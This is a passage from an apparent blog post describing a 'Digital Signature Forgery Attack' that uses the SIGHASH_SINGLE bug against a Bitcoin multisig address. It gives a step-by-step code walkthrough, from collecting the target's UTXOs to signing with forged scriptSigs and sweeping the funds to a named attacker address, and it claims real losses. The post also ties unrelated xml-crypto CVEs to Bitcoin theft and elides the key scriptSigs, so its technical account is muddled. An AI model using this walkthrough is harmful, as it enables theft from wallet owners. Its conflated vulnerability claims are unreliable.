<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-14.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-14.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>It is important to know that&nbsp;<strong>UTXO (Unspent Transaction Output)</strong>&nbsp;is a single output of a previously completed transaction that has not yet been used to create a new transaction. In other words, these are the funds remaining on the account that can be spent in the future.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Each UTXO contains information about how many satoshi it represents and what transaction it came from.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>To spend funds, you must use the UTXO as an input in a new transaction.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>UTXO sizes affect the amount that can be spent on network fees.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Total balance of the address</strong></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Taking into account the given data, the total balance of this address is: 0.006772 + 0.05 = 0.056772BTC 0.006772 + 0.05 = 0.056772BTC</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-13.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-13.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><em>These funds are available to the address owner for subsequent transactions.</em></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true,"start":2} -->
<ol start="2" class="wp-block-list"><!-- wp:list-item -->
<li><strong>Choosing UTXO for transactions</strong></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>When creating a new transaction, the wallet selects from a list of UTXOs which ones to use to cover the required amount and fee.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Sometimes it is beneficial to use several small UTXOs or one large one, depending on the situation and fee optimization.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:list {"ordered":true,"start":3} -->
<ol start="3" class="wp-block-list"><!-- wp:list-item -->
<li><strong>Security and transparency</strong></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>UTXO can be seen in blockchain explorers, which ensures transparency of your own funds and the possibility of audit.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Owning the private keys for this address gives you full control over these outputs.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Technical features of the analysis</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#technical-features-of-the-analysis"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Receiving UTXO is done through a direct request to the node or a specialized API, which allows you to quickly determine the current balances at the address.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The tool <code>darkai</code>is able to recognize and decode such data, providing a person with a convenient and understandable format.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>The team&nbsp;<code>./darkai -unspent 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe</code>identified two unspent transaction outputs (UTXOs) controlled by the specified Bitcoin address. The total available funds are approximately 0.05677 BTC, which reflects the current balance and available assets for spending. This data is key to any process of managing funds: creating new transactions, accounting for balances, optimizing fees, and ensuring the security of working with cryptocurrency.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading" id="user-content-bitcoin------sighashsingle">Script for creating and signing a Bitcoin transaction using multi-signature outputs and SIGHASH_SINGLE</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#script-for-creating-and-signing-a-bitcoin-transaction-using-multi-signature-outputs-and-sighash_single"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Let’s look at an extensive example of working with Bitcoin transactions in practice – starting from receiving unspent outputs (UTXO) of several addresses, forming a new transaction using these outputs, signing the transaction inputs using the signature type&nbsp;<code>SIGHASH_SINGLE</code>, and ending with the result – transferring all BTC to a specific address. Particular attention is paid to technical details that are important for understanding the vulnerabilities and features of Bitcoin clients with multi-signature scenarios.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading" id="user-content-1----utxo">1. Getting unspent outputs (UTXO) for addresses</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#1-getting-unspent-outputs-utxo-for-addresses"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><em>1.1. Bitcoin address of the attacker for appropriation of funds in BTC coins:</em></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><code><strong>addr = '1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3'unspent(addr)</strong></code><strong># Conclusion:</strong><code><strong>[{'output': '23e81960ba8bb95c33c2336c84c126e378e4d1123921f881da9247c25f524161:1', 'value': 300000}]</strong></code></pre>
<!-- /wp:preformatted -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>This contains one output that is unspent and available for use.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Value: 300000 satoshi ( <code>0.003 BTC</code>).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><em>1.2. Target Bitcoin address for Digital Signature Forgery Attack:</em></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><code><strong>target = '32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe'unspent(target)</strong></code><strong># Conclusion:</strong><code><strong>[  {'output': '8602122a7044b8795b5829b6b48fb1960a124f42ab1c003e769bbaad31cb2afd:0', 'value': 677200},  {'output': 'bd992789fd8cff1a2e515ce2c3473f510df933e1f44b3da6a8737630b82d0786:0', 'value': 5000000}]</strong></code></pre>
<!-- /wp:preformatted -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Two UTXOs were found for the target address with amounts of 677200 ( <code>0.006772 BTC</code>) and 5,000,000 satoshi ( <code>0.05 BTC</code>).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading" id="user-content-2">2. Forming inputs and outputs for a new transaction</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#2-forming-inputs-and-outputs-for-a-new-transaction"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>ins = unspent(addr) + unspent(target)# Calculating the amount:amount = 300000 + 5000000 + 677200 # = 5977200 satoshiamount -= 10000 # Subtracting the miner's fee: 10000 satoshi, the final amount to send:amount = 5967200 satoshi</strong></code></pre>
<!-- /wp:code -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>All three unspent outputs (UTXO) from both addresses are added to the inputs.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>For the output, the Bitcoin Address <a href="https://btc1.trezor.io/address/1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3">1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3</a> was selected , where all funds minus the commission will be sent.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>outs = &#91;{'address': addr, 'value': amount}]</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading" id="user-content-3">3. Creating and signing a transaction</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#3-creating-and-signing-a-transaction"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><em>3.1. Assembling a new transaction (without signatures):</em></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>tx = mktx(ins, outs)</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><em>3.2. Signing the first login using a private key:</em></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>tx = sign(tx, 0, priv)tx = deserialize(tx)</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><em>3.3. Manually substitute&nbsp;<code>scriptSig</code>&nbsp;for inputs using&nbsp;<strong>SIGHASH_SINGLE</strong>&nbsp;signatures:</em></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>tx['ins'][1]['script'] = '0048...53ae' # signing input 1 with multi-signature (SIGHASH_SINGLE)<br>tx['ins'][2]['script'] = '0048...53ae' # similar for input 2<code></code></strong></pre>
<!-- /wp:preformatted -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>These <code>scriptSig</code>contain two signatures, each of which signs only its corresponding input and the corresponding (single) output (SIGHASH_SINGLE).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>In addition, <code>scriptSig</code>it comes <code>redeemScript</code>with three public keys for a multi-signature wallet.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading" id="user-content-4">4. Final transaction serialization and sending</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#4-final-transaction-serialization-and-sending"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>!./darkai -serialize 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-40-1024x35.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-40-1024x35.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>This transaction spends all three inputs and sends the funds to the attacker’s Bitcoin address&nbsp;<code><a href="https://btc1.trezor.io/address/1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3">1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3</a></code></em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Final result:</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#final-result"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>tx = &#91;{'791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf'}]</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>In this case, virtually all BTC (including from the target address) were transferred under the control of one address.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a target="_blank" rel="noreferrer noopener" href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-21-1024x28.png"></a><strong><a href="https://btc1.trezor.io/tx/791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf">791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading" id="user-content-5">5. Features of using SIGHASH_SINGLE</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#5-features-of-using-sighash_single"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The serious feature <code>SIGHASH_SINGLE</code>is that the signature protects only one specific input and output with the same index.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If a transaction has more inputs than outputs, some inputs will not have a corresponding output.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Due to a known Bitcoin bug, the signature hash is returned as a fixed value in this case <code>1</code>, allowing an attacker to reuse valid signatures from another transaction for unsecured outputs.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This creates a vulnerability: forging a valid one <code>scriptSig</code>for those inputs where there is no corresponding output leads to incorrect, but accepted behavior in the network.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Even with multi-signature scenarios (&nbsp;<code>2 из 3</code>), knowing this vulnerability, an attacker can effectively steal funds by creating transactions with barely noticeable modifications using&nbsp;<code>SIGHASH_SINGLE</code>. The example provided illustrates such an attack: inputs from several Bitcoin addresses (including the target one) are collected, a transaction with one output to the attacker is formed, and the transaction is validated.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a target="_blank" rel="noreferrer noopener" href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-22.png"></a><strong><a href="https://btc1.trezor.io/tx/791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf">791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>According to the data, funds were sent to the attacker’s Bitcoin address&nbsp;<a href="https://btc1.trezor.io/address/1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3"><strong>1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3</strong></a>&nbsp;, where by processing the unupdated&nbsp;&nbsp;<strong><a href="https://github.com/keyhunters/xml-crypto">xml-crypto</a></strong>&nbsp;library &nbsp;for incorrect data values, manipulative transactions were made from the Bitcoin wallet:&nbsp;&nbsp;<strong><a href="https://btc1.trezor.io/address/32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe">32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe</a></strong>&nbsp;&nbsp;, where subsequently coins were lost in the amount of:&nbsp;&nbsp;<strong>0.059672 BTC</strong>&nbsp;&nbsp;as of July 2025, this amount is:&nbsp;&nbsp;<strong>7,052 USD</strong></em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a target="_blank" rel="noreferrer noopener" href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-23-1024x15.png"></a><code><a href="https://btc1.trezor.io/address/1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3"><strong>1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3</strong></a></code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-6">Conclusion</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#conclusion"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>As a result of cryptanalysis of the cryptographic attack of forgery of digital signature (Digital Signature Forgery Attack), it becomes obvious that despite the high reliability of the basic cryptographic algorithms, such vulnerabilities as&nbsp;<code>CVE-2025-29774</code>&nbsp;in&nbsp;<code>CVE-2025-29775</code>&nbsp;the library&nbsp;<code>xml-crypto</code>&nbsp;and the bug&nbsp;<code>SIGHASH_SINGLE</code>in the Bitcoin protocol open up effective ways for attackers to bypass authentication mechanisms and steal cryptocurrency without private keys. Using the example of the attack on the multi-signature wallet Copay, it is shown how the subtleties of cryptographic implementation and errors in signature verification lead to the loss of funds and the undermining of trust in the security of the blockchain.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This clearly demonstrates that the stability of crypto platforms depends not only on cryptographic algorithms, but also on the correct implementation and timely updating of components involved in verifying digital signatures.</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><em>Secure processing with Bitcoin requires the correct use of signature types  <code>SIGHASH</code>.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em>How the total input portion of a new transaction is formed from UTXOs of multiple addresses.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em>How to create and sign a complex multi-signature transaction using the flag  <code>SIGHASH_SINGLE</code>.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em>How known features of the Bitcoin protocol can lead to a vulnerability that can lead to theft of funds.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em>As a final result: all BTC addresses were transferred to one controlled address.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em>Improvements to signatures (such as Taproot and Schnorr signatures) are aimed at addressing such issues.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em>Wallet developers must strictly validate and update transaction generation components.</em></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>To prevent such incidents, it is necessary to immediately eliminate the identified vulnerabilities, switch to more secure algorithms (for example, from SHA-1 to SHA-256), and introduce comprehensive methods for assessing and strengthening cybersecurity, since in the era of rapidly developing technologies and new types of attacks, the security of cryptocurrency systems requires constant monitoring, rapid response and a comprehensive approach – only then can we guarantee the protection of digital assets and maintain user confidence in the blockchain.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">References:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#references"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong><em><a href="https://darkai.ru/modern-password-cryptanalysis-how-unique-salts-and-slowdown-algorithms-protect-data-in-the-age-of-attacks-and-bitcoin/">Modern Password Cryptanalysis:</a></em></strong> <em>How Unique Salts and Slowdown Algorithms Protect Data in the Age of Attacks and Bitcoin</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/cryptanalysis-of-bitcoin-transactions-internal-mechanisms-and-software-features/">Cryptanalysis of Bitcoin transactions:</a></strong></em> <em>internal mechanisms and software features</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/segregated-witness-a-key-step-towards-bitcoin-scalability-and-security-is-deep-cryptanalysis-how-segwit-implementation-affects-protection-against-transaction-data-forgery/">Segregated Witness: A Key Step Towards Bitcoin Scalability &amp; Security</a></strong> Is Deep Cryptanalysis. How SegWit Implementation Affects Protection Against Transaction Data Forgery</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/bitcoin-cryptanalysis-mechanisms-and-reliability-of-sha-256-in-ensuring-blockchain-security-and-how-future-technological-advances-will-affect-sha-256s-resilience-to-digital-signature-forgery-attack/">Bitcoin Cryptanalysis: Mechanisms and Reliability of SHA-256</a> </strong>in Ensuring Blockchain Security and How Future Technological Advances Will Affect SHA-256’s Resilience to Digital Signature Forgery Attacks</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/hidden-risks-of-multi-signature-bitcoin-wallets-analysis-of-copay-vulnerability-via-sighash_single-attack-digital-signature-forgery-attack-vulnerabilities-such-as-cve-2025-29774-and-cve-2025-29775/">Hidden risks of multi-signature Bitcoin wallets: analysis of Copay vulnerability</a></strong> via SIGHASH_SINGLE attack (Digital Signature Forgery Attack) vulnerabilities such as CVE-2025-29774 and CVE-2025-29775 in the xml-crypto library and the SIGHASH_SINGLE bug in the Bitcoin protocol</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/deserializesignature-vulnerability-in-bitcoin-protocol-deep-cryptanalysis-and-risks-of-forging-ecdsa-signatures-and-how-to-protect-against-fake-signatures-in-the-bitcoin-network-that-exploit-this-vul/">DeserializeSignature vulnerability in Bitcoin protocol: deep cryptanalysis and risks</a></strong> of forging ECDSA signatures and how to protect against fake signatures in the Bitcoin network that exploit this vulnerability</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/multi-signatures-in-bitcoin-how-it-works-how-to-protect-funds-how-it-works-and-how-leaking-private-keys-increases-fraud-risks/">Multi-Signatures in Bitcoin: How It Works, How to Protect Funds</a></strong>, How It Works, and How Leaking Private Keys Increases Fraud Risks</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/the-new-frontier-of-cybersecurity-key-ecosystem-vulnerabilities-and-cryptanalysis-bitcoin-2025-iot-security-threat-from-cve-2025-27840-vulnerability-in-esp32-microcontrollers/">The New Frontier of Cybersecurity Key Ecosystem Vulnerabilities and Cryptanalysis Bitcoin 2025:</a></strong> IoT Security Threat from CVE-2025-27840 Vulnerability in ESP32 Microcontrollers</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/large-bitcoin-transaction-worth-around-8-billion-80000-btc-were-moved/">Unveiling Anomalies: Cryptanalytic Insights into the $8 Billion Bitcoin Transaction</a></strong> and Its Implications for Blockchain Transparency</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><a href="https://darkai.ru/the-largest-incident-is-the-hack-of-the-iranian-crypto-exchange-nobitex-and-the-hack-of-the-resupplyfi-protocol-9-6-million-in-damages/"><strong>Cryptanalytic Disclosures: Unmasking Geopolitical Cyber Espionage</strong></a> and Financial Irregularities in the Nobitex Blockchain Breach</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><a href="https://darkai.ru/crypto-hack-and-fraud-costs-in-the-first-six-months-of-2025-a-detailed-look/"><strong>Cryptanalysis of the 2025 Bitcoin Blockchain: Unraveling Over $2 Billion in Crypto Hacks</strong></a> and Fraud in H1 Amid Escalating Cyber Threats</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><a href="https://darkai.ru/cyberattacks-on-web3-projects-hackers-stole-about-1-million-in-cryptocurrency-posing-as-it-specialists/">C<strong>ryptanalysis of Bitcoin Amid Evolving Web3 Cyberattacks: Dissecting $1 Million Theft</strong></a> by Impersonating IT Specialists and the Escalating Security Crisis in 2025</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/record-losses-in-the-crypto-industry-80-of-thefts-are-related-to-attacks-on-private-keys-and-frontends-of-bitcoin-wallet/">Cryptanalysis of the Bitcoin Blockchain in 2025: Revealing the Surge</a></strong> of $2.1 Billion Lost to Private Key and Front-End Exploits Driving Record Crypto Thefts</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/complex-cyberattack-on-bedrock-protocol-social-engineering-insider-threat-and-tvl-growth-despite-leak/">Cryptanalysis of the Bedrock Protocol Breach: Unraveling Social Engineering</a></strong>, Insider Threats, and Resilient TVL Growth in a $2 Million Liquid Staking Cyberattack</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><a href="https://darkai.ru/sparkkitty-a-new-cross-platform-trojan-that-steals-cryptodata-via-infected-apps-a-threat-to-users-in-southeast-asia-china-and-around-the-world/"><strong>SparkKitty, a new cross-platform Trojan that steals cryptodata via infected apps:</strong></a> a threat to users in Southeast Asia, China and around the world</em>: <em>Cryptanalysis of Bitcoin Security Threats: Unmasking SparkKitty Trojan’s Cross-Platform Crypto Data Heist on iOS and Android in Southeast Asia and Beyond</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://darkai.ru/discord-ledger-hack-and-data-leaks-how-scammers-exploit-users-trust-to-steal-cryptocurrency-and-what-security-measures-are-in-place/">Discord Ledger Hack and Data Leaks: How Scammers Exploit Users’ Trust to Steal Cryptocurrency</a></strong> and What Security Measures Are in Place</em>: <em>Cryptanalysis of Blockchain Security: Investigating the Ledger Discord Hack and the Exploitation of User Trust in Crypto Seed Phrase Phishing Attacks</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><a href="https://darkai.ru/critical-mobius-token-hack-over-2-15m-stolen-on-bnb-chain-scale-of-losses-undermines-investor-confidence-calls-for-security-enhancements/"><strong>Critical Mobius Token Hack: Over $2.15M Stolen on BNB Chain — Scale of Losses</strong></a> Undermines Investor Confidence, Calls for Security Enhancements</em>: <em>Cryptanalysis and Exploit Dynamics of the Mobius Token Smart Contract Hack: Unveiling the $2.15 Million BNB Chain Breach and its Implications for DeFi Security in 2025</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><a href="https://darkai.ru/meta-pool-stops-hacker-attack-quick-unstake-vulnerability-allowed-creation-of-uncollateralized-mpeth-tokens-but-low-liquidity-and-quick-response-minimized-damage/"><strong>Meta Pool Stops Hacker Attack: Quick Unstake Vulnerability Allowed Creation of Uncollateralized</strong> </a>mpETH Tokens, But Low Liquidity and Quick Response Minimized Damage: Cryptanalysis of the Meta Pool Breach: Dissecting the $27M mpETH Minting Exploit Through Fast Unstake Vulnerability and Liquidity Constraints</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
